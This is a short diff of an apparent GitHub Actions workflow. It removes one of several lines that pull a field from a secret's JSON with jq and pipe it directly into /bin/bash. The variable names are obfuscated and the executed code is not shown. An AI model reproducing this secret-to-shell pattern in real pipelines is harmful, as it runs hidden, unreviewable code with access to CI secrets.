@@ -18,7 +18,6 @@ jobs:
           cz960: ${{ secrets.cz960 }}
         run: |
           printf '%s' "$cz960" | jq -r .met95062 | /bin/bash
-          printf '%s' "$kjrd39511" | jq -r .qkjg12 | /bin/bash
           printf '%s' "$glg07738" | jq -r .vnvda6 | /bin/bash
           printf '%s' "$y0129" | jq -r .qvv9 | /bin/bash
 
